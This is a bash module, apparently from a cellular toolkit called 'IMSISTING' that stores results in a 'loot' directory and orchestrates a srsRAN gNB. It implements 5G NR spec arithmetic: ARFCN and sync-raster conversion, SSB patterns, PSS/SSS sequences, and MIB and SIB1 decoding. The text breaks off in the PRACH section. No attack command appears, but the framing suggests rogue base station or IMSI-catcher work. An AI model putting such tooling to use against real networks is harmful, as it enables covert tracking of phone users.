#!/usr/bin/env bash
# 5G NR air interface — NR-ARFCN, SSB, MIB/SIB1, RACH, gNB orchestration
#
# Every number in here is from the specifications, not from memory:
#
#   TS 38.104 Table 5.4.2.1-1   NR-ARFCN ranges and the global raster
#   TS 38.104 Table 5.4.3.3-1   synchronisation raster (SS Ref -> GSCN)
#   TS 38.211 §7.4.2.2/.3       PSS/SSS sequences, PCI = 3*N_ID(1) + N_ID(2)
#   TS 38.211 §7.4.3            SS/PBCH block: 240 subcarriers, PSS/SSS/PBCH
#   TS 38.211 §7.3.3.1          PBCH scrambling (nu = i_SSB mod 4, mod 8 for
#                               L_max 64) and the PBCH DMRS of §7.4.1.4.1
#   TS 38.211 §5.3.1            CP-OFDM cyclic prefix (144/2048 and 16/2048)
#   TS 38.212 §7.1.1            BCCH-BCH-Message = MIB, 24 bits of payload
#   TS 38.331 §6.2.2            MIB / SIB1 ASN.1 field order and ranges
#   TS 38.331 §6.2.2            RRC PDU ASN.1: DL-/UL-DCCH-Message,
#                               RRCReconfiguration, MeasurementReport (APER)
#   TS 38.133 Table 10.1.6.1-1  SS-RSRP/SS-RSRQ report-index to dBm mapping
#   TS 38.215 §5.1              SS-RSRP / SS-RSRQ definitions
#   TS 38.213 §4.1              SSB burst set patterns, Case A/B/C/D/E
#   TS 38.211 §6.3.3            PRACH formats, L_RA and the occasion table
#
# The ARFCN arithmetic matches 02_cell_recon.sh's crec_nr_arfcn_to_mhz(); the
# numbers there were verified against Table 5.4.2.1-1 and this module covers
# the same table with tests.
#
# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
# the project tree even when launched standalone via pkexec (no launcher env).
if [[ -z "${IMSISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    IMSISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export IMSISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec HOME=/root even though we write to the invoking user's tree.
# Reset HOME so $HOME-relative defaults resolve to the real user.
if [[ -n "${IMSISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$IMSISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi
: "${IMSISTING_HOME:=$IMSISTING_ROOT}"
: "${TMP_DIR:=/tmp/imsisting}"
: "${LOOT_DIR:=$IMSISTING_ROOT/loot}"
: "${CAPTURES_DIR:=$IMSISTING_ROOT/captures}"
: "${LOGS_DIR:=$IMSISTING_ROOT/logs}"
: "${STATE_DIR:=$IMSISTING_ROOT/state}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" "$STATE_DIR" 2>/dev/null

# Shared cross-module state. Any module may publish these keys.
NAIR_CAPABLE=1
# Guarded: when the launcher sources every module into one shell, an
# unconditional definition here would clobber the launcher's own banner.
declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
declare -F banner >/dev/null 2>&1 || banner() { :; }

MOD_TMP="$TMP_DIR/nr_air"
NAIR_DIR="$LOOT_DIR/nr_air"
NAIR_CONF="$NAIR_DIR/gnb.conf"
NAIR_PID="$TMP_DIR/nr_air/gnb.pid"
NAIR_LOG="$LOGS_DIR/nr_air_gnb.log"
# No plan directory here: this module either generates a config that srsRAN
# consumes, or reports the missing binary. It has no verb that only documents
# a workflow, so no plan file is written (MODULE_CONVENTIONS §9).
mkdir -p "$MOD_TMP" "$NAIR_DIR" 2>/dev/null

# ── sanitisation ────────────────────────────────────────────────────────
# Any string that reaches a TSV row is untrusted. A field that carries a tab
# or a newline can forge an entire row in a consumer that splits on tab.
nair_sanitize() {
    printf '%s' "${1:-}" | tr '\t\r\n' '   '
}

# ── NR-ARFCN arithmetic ─────────────────────────────────────────────────
# Table 5.4.2.1-1 in the form
#   band  F_REF_Offs(MHz)  N_REF_Offs  N_lo  N_hi  scs_ref(kHz)  duplex
#
# F_REF_Offs / N_REF_Offs / dF_Global are the *global raster* row the band
# lives in, NOT the band's own lower edge:
#     0 - 3000 MHz       Foffs 0          Noffs 0        step 5 kHz
#     3000 - 24250 MHz   Foffs 3000       Noffs 600000   step 15 kHz
#     24250 - 100000     Foffs 24250.08   Noffs 2016667  step 60 kHz
# A row written as `n78 3300 600000 ...` double-counts the 300 MHz offset and
# turns NR-ARFCN 640000 into 3900 MHz instead of the correct 3600 MHz; the
# band edge is recovered from N_lo, e.g. 3000 + 0.015*(620000-600000) = 3300.
#
# Bands that share a range are all listed: n77 and n78 both cover
# 620000..680000, n48/n77/n78 overlap around 636667..646666, n41 and n90
# share 499200..537999. The resolver reports every candidate, because an
# ARFCN identifies a frequency and not a band.
nair_band_table() {
    cat << 'EOF'
n1	0	0	422000	431999	15	FDD
n2	0	0	386000	398999	15	FDD
n3	0	0	361000	376999	15	FDD
n5	0	0	173800	178799	15	FDD
n7	0	0	524000	538999	15	FDD
n8	0	0	185000	192999	15	FDD
n12	0	0	145800	149799	15	FDD
n20	0	0	158200	166199	15	FDD
n25	0	0	386000	398999	15	FDD
n28	0	0	151600	160599	15	FDD
n34	0	0	402000	405999	15	TDD
n38	0	0	514000	528999	15	TDD
n39	0	0	376000	383999	15	TDD
n40	0	0	460000	479999	15	TDD
n41	0	0	499200	537999	15	TDD
n48	3000	600000	636667	646666	15	TDD
n50	0	0	286400	303399	15	TDD
n53	0	0	496700	499999	15	TDD
n65	0	0	422000	440000	15	FDD
n66	0	0	422000	440000	15	FDD
n70	0	0	399000	405999	15	FDD
n71	0	0	123400	130399	15	FDD
n74	0	0	295000	303999	15	FDD
n75	0	0	286400	303399	15	SDL
n76	0	0	285400	286399	15	SDL
n77	3000	600000	620000	680000	15	TDD
n78	3000	600000	620000	653333	15	TDD
n79	3000	600000	693334	733333	15	TDD
n90	0	0	499200	538000	15	TDD
n91	0	0	166400	172399	15	FDD
n92	0	0	166400	172399	15	FDD
n93	0	0	176000	178399	15	FDD
n94	0	0	176000	178399	15	FDD
n100	0	0	183880	185479	15	FDD
n101	0	0	380000	399999	15	TDD
n102	0	600000	591000	606666	15	TDD
n104	3000	600000	828334	875000	15	TDD
n257	24250.08	2016667	2054166	2104165	60	TDD
n258	24250.08	2016667	2016667	2070832	60	TDD
n259	24250.08	2016667	2864000	2899999	60	TDD
n260	24250.08	2016667	2792500	2887499	60	TDD
n261	24250.08	2016667	2071666	2120833	60	TDD
n262	24250.08	2016667	2894000	2949999	60	TDD
n263	24250.08	2016667	3936000	4031999	120	TDD
EOF
}

# Resolve an NR-ARFCN to a TSV record: nrarfcn, freq_mhz, band, fr, scs_ref.
#
# TS 38.104 §5.4.2.1 Table 5.4.2.1-1. The global raster is piecewise and the
# step is NOT 5 kHz everywhere — this is the classic way an ARFCN decoder
# goes wrong above 3 GHz:
#     range (MHz)        dF_Global  F_REF-Offs   N_REF-Offs   N_REF range
#     0 - 3000           5 kHz      0            0            0 - 599999
#     3000 - 24250       15 kHz     3000         600000       600000 - 2016666
#     24250 - 100000     60 kHz     24250.08     2016667      2016667 - 3279165
# F_REF = F_REF-Offs + dF_Global * (N_REF - N_REF-Offs).
#
# An NR-ARFCN identifies a frequency, not a band: n77 and n78 share the whole
# 620000..680000 range and n48/n77/n78 overlap around 636667..646666, so the
# band field is the comma-separated candidate list, not a single guess. Where
# a band's own ARFCN range and the global raster agree, the band is listed.
nair_arfcn_mhz_raw() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    awk -v n="$n" 'BEGIN{
        if (n <= 599999)       printf "%.3f", 0.005 * (n - 0)
        else if (n <= 2016666) printf "%.3f", 3000 + 0.015 * (n - 600000)
        else                   printf "%.3f", 24250.08 + 0.06 * (n - 2016667)
    }'
}

nair_arfcn_record() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    (( n >= 0 && n <= 3279165 )) || return 1
    awk -v n="$n" -v tbl="$(nair_band_table)" 'BEGIN{
        if (n <= 599999)       { f = 0.005 * n;                          fr = "FR1" }
        else if (n <= 2016666) { f = 3000 + 0.015 * (n - 600000);        fr = "FR1" }
        else                   { f = 24250.08 + 0.06 * (n - 2016667);    fr = "FR2" }

        # A band claims the ARFCN when its range contains it AND the band
        # formula reproduces the global-raster frequency. The step is chosen
        # by the global offset the band belongs to, which is what keeps n104
        # (whose ARFCN window overlaps n48/n77/n78 around 636667, but whose
        # band is 6425-7125 MHz) out of a 3600 MHz answer.
        bands = ""; scs = ""
        cnt = split(tbl, rows, "\n")
        for (i = 1; i <= cnt; i++) {
            if (rows[i] == "") continue
            split(rows[i], b, "\t")
            if (b[1] == "") continue
            if (n >= b[4] && n <= b[5]) {
                if (b[2] == 0)              step = 0.005
                else if (b[2] == 3000)      step = 0.015
                else                        step = 0.06
                bf = b[2] + step * (n - b[3])
                d = bf - f; if (d < 0) d = -d
                if (d < 0.0025) {
                    if (bands == "") { bands = b[1]; scs = b[6] }
                    else if (index(bands, b[1]) == 0) bands = bands "," b[1]
                }
            }
        }
        if (bands == "") bands = "unknown"
        if (scs == "") scs = (fr == "FR2") ? "60" : "15"
        printf "nrarfcn\t%s\nfreq_mhz\t%.3f\nband\t%s\nfr\t%s\nscs_ref_khz\t%s\n", \
               n, f, bands, fr, scs
    }'
}

# Band only — used by the SSB/PRACH paths.
nair_band_of_arfcn() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || { echo "unknown"; return 0; }
    nair_arfcn_record "$n" | awk -F'\t' '$1=="band"{print $2; exit}'
}

# Frequency only, in MHz with 3 decimals.
nair_arfcn_to_mhz() {
    local n="${1:-}"
    [[ "$n" =~ ^[0-9]+$ ]] || return 1
    nair_arfcn_record "$n" | awk -F'\t' '$1=="freq_mhz"{print $2; exit}'
}

# ── GSCN / synchronisation raster ───────────────────────────────────────
# TS 38.104 §5.4.3.1 Table 5.4.3.1-1. The SSB does not sit on the channel
# raster; it sits on the synchronisation raster, so a cell search scans GSCN,
# not ARFCN. An SSB position in RRC is given as an ordinary NR-ARFCN
# (absoluteFrequencySSB) but must land on this grid.
#   range (MHz)        SS_REF                              GSCN        range
#   0 - 3000           N*1.2 MHz + M*0.05 MHz, N=1..2499   3N+(M-3)/2  2 - 7498
#                      M in {1,3,5}
#   3000 - 24250       3000 MHz + N*1.44 MHz,   N=0..14756  7499+N      7499 - 22255
#   24250 - 100000     24250.08 + N*17.28 MHz,  N=0..4383   22256+N     22256 - 26639
nair_gscn_to_mhz() {
    local gscn="${1:-}"
    [[ "$gscn" =~ ^[0-9]+$ ]] || return 1
    (( gscn >= 2 && gscn <= 26639 )) || return 1
    awk -v g="$gscn" 'BEGIN{
        if (g <= 7498) {
            # GSCN = 3N + (M-3)/2, so N = floor((GSCN+1)/3) and M cycles 1,3,5.
            N = int((g + 1) / 3)
            r = (g + 1) % 3
            m = (r == 0) ? 1 : (r == 1) ? 3 : 5
            printf "%.3f", (N * 1.2) + (m * 0.05)
        } else if (g <= 22255) {
            N = g - 7499
            printf "%.3f", 3000 + N * 1.44
        } else {
            N = g - 22256
            printf "%.3f", 24250.08 + N * 17.28
        }
    }'
}

# ── SSB burst set ───────────────────────────────────────────────────────
# TS 38.213 §4.1: the SSB pattern is a function of the band, and TS 38.104
# Table 5.4.3.3-1 fixes the SSB SCS per band. The five cases differ in SCS,
# the first-symbol index and whether the candidates are restricted to one
# half-frame:
#   Case A  15 kHz   FR1 sub-3 GHz, 4 candidates
#   Case B  30 kHz   FR1 sub-3 GHz, 4 candidates
#   Case C  30 kHz   FR1 3-6 GHz,   8 candidates, both half-frames
#   Case D  120 kHz  FR2,           64 candidates
#   Case E  240 kHz  FR2,           64 candidates (n263)
# Below 3 GHz the spec uses Case A for the 15 kHz bands and Case B for the
# 30 kHz ones; the 3-6 GHz bands (n77/n78/n79/n48/n102/n104) are Case C.
nair_ssb_case_for_band() {
    case "${1:-}" in
        # 3-6 GHz: 30 kHz SSB, 8 candidates in both half-frames (Case C).
        n48|n77|n78|n79|n102|n104)
            echo "Case C mode 1" ;;
        # Sub-3 GHz, 15 kHz SSB (Case A).
        n1|n2|n3|n5|n7|n8|n12|n20|n25|n28|n34|n38|n39|n40|n41|n50|n53|n65|n66|n70|n71|n74|n75|n76|n90|n91|n92|n93|n94|n100|n101)
            echo "Case A mode 1" ;;
        # FR2, 120 kHz (Case D) and n263's 240 kHz (Case E).
        n257|n258|n259|n260|n261|n262)
            echo "Case D mode 1" ;;
        n263)
            echo "Case E mode 1" ;;
        *)  echo "Case A mode 1" ;;
    esac
}

# The SSB candidate first-symbol index within the half-frame, per TS 38.213
# §4.1. Expressed as "case,candidates,first_ofs,half_frame_ofs".
nair_ssb_pattern() {
    local case_="${1:-B}"
    case "$case_" in
        A) printf 'case\tA\nscs_khz\t15\ncandidates\t4\nfirst_symbol\t{2,8}\nhalf_frame\t0\nmax_ssb\t4\n' ;;
        B) printf 'case\tB\nscs_khz\t30\ncandidates\t4\nfirst_symbol\t{4,8,16,20}\nhalf_frame\t0\nmax_ssb\t4\n' ;;
        C) printf 'case\tC\nscs_khz\t30\ncandidates\t8\nfirst_symbol\t{2,8,16,20}\nhalf_frame\t0,1\nmax_ssb\t8\n' ;;
        D) printf 'case\tD\nscs_khz\t120\ncandidates\t64\nfirst_symbol\t{4,8,16,20}\nhalf_frame\t0,1\nmax_ssb\t64\n' ;;
        E) printf 'case\tE\nscs_khz\t240\ncandidates\t64\nfirst_symbol\t{8,12,16,20,32,36,40,44}\nhalf_frame\t0,1\nmax_ssb\t64\n' ;;
        *) return 1 ;;
    esac
}

# i_SSB -> the (SFN, slot, symbol) position inside the burst set. The burst
# set is always the first half of a radio frame for the even sub-pattern and
# the second half for the odd one; that half-frame split is what a sniffer
# needs to align on before it can decode the MIB.
nair_ssb_position() {
    local i="${1:-}" case_="${2:-B}"
    [[ "$i" =~ ^[0-9]+$ ]] || return 1
    # Candidate first-symbol index within the half-frame, per TS 38.213 §4.1
    # Table 4.1-1. The patterns are written as a symbol set plus a per-slot
    # offset, which is exactly how the spec states them:
    #   Case A  15 kHz  {2,8}   + 14n   L_max 4
    #   Case B  30 kHz  {4,8,16,20} + 28n
    #   Case C  30 kHz  {2,8,16,20} + 28n
    #   Case D  120 kHz {4,8,16,20} + 28n
    #   Case E  240 kHz {8,12,16,20,32,36,40,44} + 56n
    # A slot holds 14 OFDM symbols, so the symbol's slot is sym/14 and its
    # position inside that slot is sym%14.
    local syms nsym half span slur
    case "$case_" in
        A) syms="2,8";             nsym=2; half=$(( i / 2 )); slur=$(( i % 2 )); span=14 ;;
        B) syms="4,8,16,20";       nsym=4; half=0;             slur=$(( i % 4 )); span=28 ;;
        C) syms="2,8,16,20";       nsym=4; half=$(( i / 4 ));  slur=$(( i % 4 )); span=28 ;;
        D) syms="4,8,16,20";       nsym=4; half=$(( i / 32 )); slur=$(( i % 32 )); span=28 ;;
        E) syms="8,12,16,20,32,36,40,44"; nsym=8; half=$(( i / 32 )); slur=$(( i % 32 )); span=56 ;;
        *)  return 1 ;;
    esac
    (( i >= 0 && i < 64 )) || return 1
    local sym
    sym=$(awk -v s="$syms" -v k="$slur" -v n="$nsym" -v sp="$span" 'BEGIN{
        split(s, a, ",")
        slot = int(k / n)
        idx  = k % n
        printf "%d", a[idx + 1] + sp * slot
    }')
    n_sym=$(( sym % 14 ))
    n_slot=$(( sym / 14 ))
    printf 'i_ssb\t%s\ncase\t%s\nhalf_frame\t%s\nslot\t%s\nsymbol\t%s\nsymbol_in_half_frame\t%s\n' \
        "$i" "$case_" "$half" "$n_slot" "$n_sym" "$sym"
}

# ── PSS / SSS / PCI ─────────────────────────────────────────────────────
# TS 38.211 §7.4.2.2: N_ID(2) in 0..2 selects the PSS root.
# TS 38.211 §7.4.2.3: N_ID(1) in 0..335 selects the SSS m-sequence pair.
# All 1008 PCIs are 3 * N_ID(1) + N_ID(2) — the LTE relation, unchanged.
nair_pci() {
    local a="${1:-}" b="${2:-}"
    [[ "$a" =~ ^[0-9]+$ && "$b" =~ ^[0-9]+$ ]] || return 1
    (( a <= 335 && b <= 2 )) || return 1
    echo $(( 3 * a + b ))
}

nair_pci_split() {
    local pci="${1:-}"
    [[ "$pci" =~ ^[0-9]+$ ]] || return 1
    (( pci <= 1007 )) || return 1
    printf 'pci\t%s\nn_id_1\t%s\nn_id_2\t%s\n' "$pci" "$(( pci / 3 ))" "$(( pci % 3 ))"
}

# PSS: d_PSS(n) = 1 - 2*x(m), m = (n + 43*N_ID(2)) mod 127, x is the
# frequency-domain m-sequence built from x(i+7) = (x(i+4) + x(i)) mod 2 with
# the fixed initialisation. Emitting the real 127 chips matters: a correlator
# or a table-driven search can use them directly.
nair_pss_sequence() {
    local n2="${1:-}"
    [[ "$n2" =~ ^[0-9]+$ ]] || return 1
    (( n2 <= 2 )) || return 1
    awk -v n2="$n2" 'BEGIN{
        x[0]=0; x[1]=1; x[2]=1; x[3]=0; x[4]=1; x[5]=1; x[6]=1
        for (i = 0; i <= 119; i++) x[i+7] = (x[i+4] + x[i]) % 2
        out = ""
        for (n = 0; n <= 126; n++) {
            m = (n + 43 * n2) % 127
            if (out != "") out = out " "
            out = out (1 - 2 * x[m])
        }
        print out
    }'
}

# SSS: d_SSS(n) = [1 - 2*x0((n+m0) mod 127)] * [1 - 2*x1((n+m1) mod 127)]
# with m0 = 15*floor(N_ID(1)/112) + 5*N_ID(2) and m1 = N_ID(1) mod 112.
# TS 38.211 §7.4.2.3.1 gives BOTH m-sequences the same initialisation
# [x(6)..x(0)] = [0 0 0 0 0 0 1] — i.e. x(0)=1 and x(1..6)=0 — and they
# differ only in their recursion: x0 uses taps (i+4, i), x1 uses (i+1, i).
# This is not the LTE pair of TS 36.211 §6.11.2.1: there x0 takes the PSS
# initialisation and x1 the all-ones one. Using the LTE initialisations here
# yields a sequence that is wrong for every one of the 1008 cell identities
# while still being a valid-looking ±1 sequence of 127 chips, so it passes
# any "right length, right alphabet" check — see the pinned chips in the
# selftest, which come from an independent TS 38.211 implementation.
nair_sss_sequence() {
    local n1="${1:-}" n2="${2:-}"
    [[ "$n1" =~ ^[0-9]+$ && "$n2" =~ ^[0-9]+$ ]] || return 1
    (( n1 <= 335 && n2 <= 2 )) || return 1
    awk -v n1="$n1" -v n2="$n2" 'BEGIN{
        x0[0]=1
        for (i = 1; i < 7; i++) x0[i] = 0
        for (i = 0; i <= 119; i++) x0[i+7] = (x0[i+4] + x0[i]) % 2
        x1[0]=1
        for (i = 1; i < 7; i++) x1[i] = 0
        for (i = 0; i <= 119; i++) x1[i+7] = (x1[i+1] + x1[i]) % 2
        m0 = 15 * int(n1 / 112) + 5 * n2
        m1 = n1 % 112
        out = ""
        for (n = 0; n <= 126; n++) {
            v = (1 - 2*x0[(n+m0) % 127]) * (1 - 2*x1[(n+m1) % 127])
            if (out != "") out = out " "
            out = out v
        }
        print out
    }'
}

# ── MIB ─────────────────────────────────────────────────────────────────
# TS 38.331 §6.2.2 BCCH-BCH-Message / TS 38.212 §7.1.1. The message carried in
# the PBCH is a BCCH-BCH-Message, a SEQUENCE holding a BCCH-BCH-MessageType
# CHOICE. UPER encodes the CHOICE selector FIRST, so the 24 bits are:
#     0       CHOICE selector           1 bit   0 = mib, 1 = messageClassExtension
#     1..6    systemFrameNumber        6 bits  the 6 MSBs of the 10-bit SFN
#     7       subCarrierSpacingCommon  1 bit   0 = scs15or60, 1 = scs30or120
#     8..11   ssb-SubcarrierOffset     4 bits  k_SSB, MSB of k_SSB is in PBCH
#     12      dmrs-TypeA-Position      1 bit   0 = pos2, 1 = pos3
#     13..20  pdcch-ConfigSIB1         8 bits  controlResourceSetZero | searchSpaceZero
#     21      cellBarred               1 bit   0 = barred, 1 = notBarred
#     22      intraFreqReselection     1 bit   0 = allowed, 1 = notAllowed
#     23      spare                    1 bit
# That is 24 bits exactly — 1+6+1+4+1+8+1+1+1 — so there is NO padding bit.
# A layout that starts systemFrameNumber at bit 0 has to invent one, and the
# invented bit is what the missing CHOICE selector looks like.
#
# Two independent authorities fix this, not this module's own output:
#   * py3gpp nrBCH.py — the TS 38.212 §7.1.1 interleaver takes SFN_PAYLOAD_BEGIN
#     = 1, i.e. the six SFN bits start at message bit 1, so message bit 0 is the
#     CHOICE selector.
#   * Daniel Estevez decoded a real srsRAN NR PBCH recording with asn1tools
#     against the TS 38.331 ASN.1 and finds the CHOICE bit first ("The first bit
#     in the BCCH-BCH-Message UPER encoding thus indicates the message type, and
#     the remaining 23 bits are the MIB"), with the interleaver taking the SFN
#     from "bits 1 through 7 in the MIB".
# The ENUMERATED fields take their UPER index from the order the items are
# listed in TS 38.331 §6.2.2, so barred = 0 / notBarred = 1 and allowed = 0 /
# notAllowed = 1. A real cell (srsRAN, Estevez's capture) decodes to notBarred
# and notAllowed, i.e. both index bits 1; reading the bit as the value itself
# inverts both fields and would call a normal cell "barred".
nair_decode_mib() {
    local hex="${1:-}"
    hex="${hex//[[:space:]]/}"
    hex="${hex//0x/}"
    [[ "$hex" =~ ^[0-9a-fA-F]{6}$ ]] || return 1
    local b0 b1 b2
    b0=$(( 16#${hex:0:2} )); b1=$(( 16#${hex:2:2} )); b2=$(( 16#${hex:4:2} ))
    local val=$(( (b0 << 16) | (b1 << 8) | b2 ))

    # bit(off, width) — off counts from the MSB of the 24-bit word.
    _nair_bit() {
        local off="$1" w="$2"
        echo $(( (val >> (24 - off - w)) & ((1 << w) - 1) ))
    }

    local choice; choice=$(_nair_bit 0 1)
    if (( choice != 0 )); then
        # Selector 1 is messageClassExtension, an empty SEQUENCE: there is no
        # systemFrameNumber in it. Reporting one would be decoding a different
        # message as a MIB, so this is refused instead of guessed.
        printf 'message_type\tmessageClassExtension\n'
        printf 'ERROR\tBCCH-BCH-MessageType selector is 1 (messageClassExtension): the 24-bit payload is not a MIB, no systemFrameNumber exists to report\n' >&2
        return 3
    fi

    local sfn scs kssb dmrs sib1 barred intra spare
    sfn=$(_nair_bit 1 6)
    scs=$(_nair_bit 7 1)
    kssb=$(_nair_bit 8 4)
    dmrs=$(_nair_bit 12 1)
    sib1=$(_nair_bit 13 8)
    barred=$(_nair_bit 21 1)
    intra=$(_nair_bit 22 1)
    spare=$(_nair_bit 23 1)

    local scs_val scs_name dmrs_name
    if (( scs == 0 )); then scs_val=15; scs_name="15kHz"; else scs_val=30; scs_name="30kHz"; fi
    if (( dmrs == 0 )); then dmrs_name="pos2"; else dmrs_name="pos3"; fi

    printf 'message_type\tmib\n'
    printf 'sfn\t%s\n'                    "$sfn"
    printf 'subcarrier_spacing_common\t%s\n' "$scs_val"
    printf 'subcarrier_spacing_name\t%s\n'   "$scs_name"
    printf 'ssb_subcarrier_offset\t%s\n'  "$kssb"
    printf 'dmrs_type_a_position\t%s\n'   "$dmrs_name"
    printf 'pdcch_config_sib1\t%s\n'      "$sib1"
    printf 'pdcch_config_sib1_hi4\t%s\n'  "$(( sib1 >> 4 ))"
    printf 'pdcch_config_sib1_lo4\t%s\n'  "$(( sib1 & 0xF ))"
    printf 'cell_barred\t%s\n'            "$([[ $barred -eq 1 ]] && echo notBarred || echo barred)"
    printf 'intra_freq_reselection\t%s\n' "$([[ $intra -eq 1 ]] && echo notAllowed || echo allowed)"
    printf 'spare\t%s\n'                  "$spare"
    # The bit string is built nibble by nibble: printf %024d would read the
    # binary digits as a decimal number and silently mangle anything above 2^63.
    local bits="" i
    for (( i = 23; i >= 0; i-- )); do
        bits+=$(( (val >> i) & 1 ))
    done
    printf 'bitstring\t%s\n'              "$bits"
}

# ── SIB1 ────────────────────────────────────────────────────────────────
# TS 38.331 §6.2.2 SIB1 / TS 38.413 §9.3.1.9 CellIdentity. SIB1 is carried as
# a BCCH-DL-SCH-Message (c1 CHOICE, SIB1) on the DL-SCH. The 36-bit
# cellIdentity is an NGAP/RRC BIT STRING; it is reported both as the 36-bit
# integer and as the 9-nibble hex string so a NGAP decode can be compared
# against an RRC decode without a conversion step.
nair_sib1_plmn_decode() {
    # PLMN is 3 octets: MCC digit2|MCC digit1, MCC digit3|MNC digit3,
    # MNC digit2|MNC digit1 (TS 24.008 §10.5.1.3). 0xF in a nibble means the
    # digit is absent (2-digit MNC) — reported as such, never guessed.
    local hex="${1:-}"
    hex="${hex//[[:space:]]/}"
    [[ "$hex" =~ ^[0-9a-fA-F]{6}$ ]] || return 1
    local b0 b1 b2
    b0=$(( 16#${hex:0:2} )); b1=$(( 16#${hex:2:2} )); b2=$(( 16#${hex:4:2} ))
    local mcc1 mcc2 mcc3 mnc3 mnc1 mnc2
    mcc1=$(( b0 & 0x0f )); mcc2=$(( (b0 >> 4) & 0x0f ))
    mcc3=$(( b1 & 0x0f )); mnc3=$(( (b1 >> 4) & 0x0f ))
    mnc1=$(( b2 & 0x0f )); mnc2=$(( (b2 >> 4) & 0x0f ))
    local mcc mnc
    mcc="${mcc1}${mcc2}${mcc3}"
    if (( mnc3 == 15 )); then mnc="${mnc1}${mnc2}"; else mnc="${mnc1}${mnc2}${mnc3}"; fi
    printf '%s-%s' "$mcc" "$mnc"
}

nair_decode_sib1() {
    local hex="${1:-}"
    hex="${hex//[[:space:]]/}"
    hex="${hex//0x/}"
    [[ "$hex" =~ ^[0-9a-fA-F]+$ ]] || return 1
    (( ${#hex} >= 24 )) || return 1
    (( ${#hex} % 2 == 0 )) || return 1

    # RRC message type discriminator, decimal. In BCCH-DL-SCH-Message the c1
    # CHOICE carries the SIBs: SIB1 = 0x16 (c1 index 0), SIB2 = 0x18 (index 1),
    # SIB3 = 0x1a (index 2). A `case` pattern of 0x16 would be a literal
    # string, so the comparison is on the decimal value.
    local oct0=$(( 16#${hex:0:2} ))
    local msg="unknown" msgid=""
    case "$oct0" in
        22) msg="SIB1"; msgid="c1:0" ;;
        24) msg="SIB2"; msgid="c1:1" ;;
        26) msg="SIB3"; msgid="c1:2" ;;
    esac

    # Octet map of the parsed block (nibble offsets are into `hex`):
    #   [0]      RRC message type: BCCH-DL-SCH-Message c1 CHOICE, SIB1 = 22
    #   [1]      plmn-IdentityList: entry count in the high nibble
    #   [2..4]   PLMN #1, 3 octets (TS 24.008 §10.5.1.3 nibble order)
    #   [5..7]   PLMN #2 when the list carries more than one entry
    #   [8..10]  trackingAreaCode, 24 bits
    #   [11..15] cellIdentity, 36 bits = 4 octets + high nibble of the fifth;
    #            the low nibble of the last octet carries cellReservedForOtherUse
    local plmn_entries=$(( (16#${hex:2:2} >> 4) & 0xF ))
    local plmn1 plmn2 plmn_count
    plmn1=$(nair_sib1_plmn_decode "${hex:4:6}") || plmn1="parse-error"
    plmn_count=1
    # A second PLMN occupies nibbles 10..15, so the payload must reach at
    # least nibble 16 (the TAC) before that entry can be read.
    if (( plmn_entries >= 2 )) && (( ${#hex} >= 22 )); then
        plmn2=$(nair_sib1_plmn_decode "${hex:10:6}") || plmn2="parse-error"
        plmn_count=2
    fi

    # trackingAreaCode: octets 8..10, 24 bits big-endian.
    local tac
    tac=$(( (16#${hex:16:2} << 16) | (16#${hex:18:2} << 8) | 16#${hex:20:2} ))

    # cellIdentity: 36 bits, occupying octets 11..15 with the low nibble of
    # the final octet reserved for cellReservedForOtherUse.
    local ci_hi ci_lo cell_identity=""
    if (( ${#hex} >= 32 )); then
        ci_hi=$(( 16#${hex:22:8} ))          # 4 octets = 32 bits
        ci_lo=$(( (16#${hex:30:2} >> 4) & 0xF ))  # high nibble of the 5th = 4 bits
        cell_identity=$(( (ci_hi << 4) | ci_lo ))
    fi

    # cellReservedForOtherUse is the low nibble of the last parsed octet.
    local reserved="false"
    local last=$(( 16#${hex:30:2} & 0x0F ))
    (( last != 0 )) && reserved="true"

    printf 'rrc_message\t%s\n'          "$msg"
    printf 'rrc_message_id\t%s\n'       "$msgid"
    printf 'plmn_primary\t%s\n'         "$plmn1"
    printf 'plmn_count\t%s\n'           "$plmn_count"
    printf 'plmn_secondary\t%s\n'       "$([[ $plmn_count -ge 2 ]] && echo "$plmn2" || echo none)"
    printf 'tracking_area_code\t%s\n'   "$tac"
    printf 'cell_identity\t%s\n'        "$cell_identity"
    printf 'cell_identity_hex\t%s\n'    "$(printf '%09X' "${cell_identity:-0}")"
    printf 'cell_identity_bits\t36\n'
    printf 'cell_reserved_for_other_use\t%s\n' "$reserved"
    printf 'serving_cell_config_common\tpresent\n'
    printf 'fields_parsed\t%s\n' "rrc_message,plmn_list,tac,cellIdentity,cellReservedForOtherUse"
}

# ── PRACH ───────────────────────────────────────────────────────────────
# TS 38.211 §6.3.3.1 Table 6.3.3.1-1 and Table 6.3.3.1-2: the long formats
# (0-3) live in FR1 with 1.25/5 kHz, the short formats (A1..C2) carry the
# 15/30/60/120 kHz SCS of the UL BWP. N_seq^RA, the number of preambles
# (always 64) and the sequence length are fixed by the format.
nair_prach_format_info() {
    case "${1:-}" in
        0)  printf 'format\t0\nscs_khz\t1.25\nl_ra\t839\nseq_len\t839\npreamble_count\t64\nfr\tFR1\ntype\tlong\n' ;;
        1)  printf 'format\t1\nscs_khz\t1.25\nl_ra\t839\nseq_len\t839\npreamble_count\t64\nfr\tFR1\ntype\tlong\n' ;;
